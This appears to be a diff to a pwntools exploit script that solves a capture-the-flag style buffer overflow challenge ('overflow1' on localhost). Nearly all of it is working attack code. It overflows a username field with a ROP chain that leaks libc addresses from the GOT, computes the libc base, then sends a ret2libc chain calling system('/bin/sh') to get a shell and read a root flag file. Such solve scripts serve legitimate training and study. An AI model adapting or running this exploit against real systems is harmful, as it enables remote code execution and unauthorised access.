@@ -3,7 +3,6 @@
 # This exploit template was generated via:
 # $ pwn template --host localhost --port 14003 --libc ../../libc.so.6 ../src/overflow1
 from pwn import *
-from pwnlib.tubes import buffer
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or "../src/overflow1.debug")
@@ -83,7 +82,7 @@ def change_username(io: connect | process, payload: bytes):
     io.recvuntil(b"> ")
 
 
-def login(io: process | connect, username = login_user, password = login_pass):
+def login(io: process | connect, username=login_user, password=login_pass):
     # login
     io.recvuntil(b"name: ")
     io.sendline(username.encode("ascii"))
@@ -92,75 +91,83 @@ def login(io: process | connect, username = login_user, password = login_pass):
     io.recvuntil(b"> ")
 
 
-io = start()
+def exploit() -> bool:
+    io = start()
 
-# logging
-io.info("Getting the host flag via. buffer overflow.")
+    # logging
+    io.info("Getting the host flag via. buffer overflow.")
 
-# from the binary
+    # from the binary
+    buffer_size = 32
+    struct_size = 72
+    payload_size = 88
 
-# user_t struct size
-buffer_size = 32
-struct_size = 72
-payload_size = 88
+    # function imports
+    syms = ["puts", "printf", "exit", "fgets"]
+    addrs = {}
 
-# function imports
-syms = ["puts", "printf", "exit", "fgets"]
-addrs = {}
+    # creating a rop chain
+    rop = ROP(exe)
+    for sym in syms:
+        # logging in
+        login(io)
 
-# creating a rop chain
-rop = ROP(exe)
-for sym in syms:
-    # logging in 
+        # rop chain
+        rop = ROP(exe)
+        rop.puts(exe.got[sym])
+        rop.main()
+
+        # payload
+        payload = b"A" * payload_size
+        payload += rop.chain()
+
+        # sending it
+        io.debug(f"Leaking function addresses.")
+        io.debug(rop.dump())
+        change_username(io, payload)
+
+        # activating the rop chain
+        leave_prog(io)
+
+        # getting address
+        addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
+        io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}.")
+
+    # asserting libc addresses
+    libc.address = addrs[syms[0]] - libc.sym[syms[0]]
+    assert libc.address & 0xFFF == 0
+    for sym in syms:
+        io.debug(f"{sym}: {hex(libc.sym[sym])}@libc, {hex(addrs[sym])}@leak")
+        # assert libc.sym[sym] == addrs[sym]
+
+    # forming ret2libc
     login(io)
 
-    # rop chain
-    rop = ROP(exe)
-    rop.puts(exe.got[sym])
-    rop.main()
+    # exploit
+    rop = ROP(libc)
+    rop.raw(rop.ret)
+    rop.system(next(libc.search(b"/bin/sh")))
 
-    # payload
+    # forming the payload
     payload = b"A" * payload_size
     payload += rop.chain()
-    
-    # sending it
-    io.debug(f"Leaking function addresses.")
-    io.debug(rop.dump())
+
+    # sending exploit
     change_username(io, payload)
-    
-    # activating the rop chain
     leave_prog(io)
 
-    # getting address
-    addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\0'))
-    io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}.")
+    # enjoy the shell
+    io.sendline(b"cat flag.root.txt")
+    flag = io.recvuntil(b"\n", drop=True).decode("ascii")
 
-# setting libc
-libc = ELF("../../libc.so.6")
-if libc == None:
-    io.failure("Couldn't load libc.so.6 from pwn/, cannot complete solve.")
+    # comparing to the actual flag
+    with open("./flag.root.txt", "r") as f_in:
+        buf = f_in.readline().strip()
+        if buf in flag:
+            io.success(f"Flag: {flag}")
+            return True
+        return False
 
-# asserting libc addresses
-libc.address = addrs[syms[0]] - libc.sym[syms[0]]
-assert libc.address & 0xfff == 0
-for sym in syms:
-    io.debug(f"{sym}: {hex(libc.sym[sym])}@libc, {hex(addrs[sym])}@leak")
-    #assert libc.sym[sym] == addrs[sym]
 
-# forming ret2libc
-login(io)
-
-# exploit
-rop = ROP(libc)
-rop.raw(rop.ret)
-rop.system(next(libc.search(b"/bin/sh")))
-payload = b"A" * payload_size
-payload += rop.chain()
-
-# sending exploit
-change_username(io, payload)
-leave_prog(io)
-
-# enjoy the shell
-io.interactive()
-
+if __name__ == "__main__":
+    exit(exploit())
